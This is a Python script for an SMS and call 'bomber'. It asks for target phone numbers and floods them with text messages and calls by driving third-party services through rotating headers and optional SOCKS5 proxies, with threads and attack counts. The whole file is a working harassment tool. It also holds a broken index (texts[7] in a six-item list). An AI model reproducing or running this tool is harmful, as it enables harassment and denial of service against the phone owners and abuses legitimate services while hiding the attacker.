import threading
import fade
import os
import sys
import inspect
import logging
import random
import time
from colorama import Back, Fore, Style, init
from headers_manager import update_headers, get_headers

init(autoreset=True)


def clear():
    if sys.platform == 'win32':
        os.system('cls')

    else:
        os.system('clear')


def banner():
    print(fade.fire('Bomber'))


def get_proxies():
    proxies = []

    try:
        with open('proxies.txt', 'r') as proxies_file:
            proxies = proxies_file.read().splitlines()
    except Exception as e:
        print(Fore.RED + f'\nError when trying to open a file proxies.txt. {e}.')

        os.abort()

    return proxies


def run_service(service_class, module_, phone, headers, proxy, type_):
    try:
        if type_ == 'call':
            result = getattr(module_, service_class)(phone, headers, proxy).send_call()

        else:
            result = getattr(module_, service_class)(phone, headers, proxy).send_sms()
    except:
        return

    return result[0]


def run_thread(threads, attacks, phones, proxy):
    global sent
    global fails

    if proxy:
        proxy = f'socks5://{proxy}'

    for _ in range(attacks):
        update_headers()

        for phone in phones:
            for module_, service_class in service_classes.items():
                call_service = hasattr(getattr(module_, service_class), 'send_call')

                headers = get_headers(service_class)

                result = run_service(service_class, module_, phone, headers, proxy, 'call' if call_service else 'sms')

                if result == 200:
                    sent += 1

                else:
                    fails += 1

                print(f'{Fore.WHITE}[{Style.BRIGHT}{Fore.YELLOW}STATUS{Fore.WHITE}] '
                      f'{Style.BRIGHT}{Fore.GREEN}SENT: {Fore.YELLOW}{sent} {Fore.RED}FAILS: {Fore.YELLOW}{fails}')

                time.sleep(random.randint(threads, threads * 10))


def main():
    proxies = get_proxies()

    texts = [
        '\nPhone number(s) to attack > ',
        '''
        ╔═══════════════════════════════════════════════╗
        ║If you are going to enter more than one number,║ 
        ║       do it in the following format:          ║  
        ║           number, number, number              ║
        ║                                               ║
        ║      Phone number format: 79222222222         ║
        ╚═══════════════════════════════════════════════╝            
        ''',
        'Use proxies (SOCKS5)? (y/n) > ',
        'Threads [1-10] > ',
        'Attacks [1-100] > ',
        'thread started'
    ]

    errors = [
        f'\n{Fore.RED}The number of threads is too small. Set to 1.\n',
        f'\n{Fore.RED}The number of threads is too large. Set to 10.\n',
        f'\n{Fore.RED}The number of attacks is too small. Set to 1.\n',
        f'\n{Fore.RED}The number of attacks is too large. Set to 100.\n',
    ]

    print(fade.fire(texts[1]))

    phones = input(Style.BRIGHT + Fore.YELLOW + texts[0] + Fore.GREEN)

    phones = phones.replace(' ', '').split(',')

    if not proxies:
        use_proxy = 'n'

    else:
        use_proxy = input(Style.BRIGHT + Fore.YELLOW + texts[2] + Fore.GREEN).lower()

    threads = int(input(Style.BRIGHT + Fore.YELLOW + texts[3] + Fore.GREEN))

    if threads < 1:
        print(fade.fire(errors[0]))

        threads = 1

    elif threads > 10:
        print(fade.fire(errors[1]))

        threads = 10

    attacks = int(input(Style.BRIGHT + Fore.YELLOW + texts[4] + Fore.GREEN))

    if attacks < 1:
        print(fade.fire(errors[2]))

        attacks = 1

    elif attacks > 100:
        print(fade.fire(errors[3]))

        attacks = 100

    started = 0

    for _ in range(threads):
        proxy = random.choice(proxies) if use_proxy.lower() in ['y', 'yes'] else ''
        
        t = threading.Thread(target=run_thread, args=(threads, attacks, phones, proxy,))
        t.start()

        started += 1

        print(f'{Fore.WHITE}[{Fore.RED}{started}{Fore.WHITE}] {Style.BRIGHT}{Fore.RED}{texts[7]}')

    time.sleep(1)

    t.join()


service_classes = {}
services = os.listdir('services')
sys.path.insert(0, 'services')

for service in services:
    if service.endswith('.py') and service != 'service.py':
        module = __import__(service[:-3])

        for member in inspect.getmembers(module, inspect.isclass):
            if member[1].__module__ == module.__name__:
                service_classes[module] = member[0]

if not os.path.isfile('proxies.txt'):
    open('proxies.txt', 'x').close()

log = logging.getLogger('werkzeug')

try:
    while True:
        sent = 0
        fails = 0

        clear()
        banner()
        main()
except KeyboardInterrupt:
    print(fade.fire('\n\nExiting...'))

    os.abort()
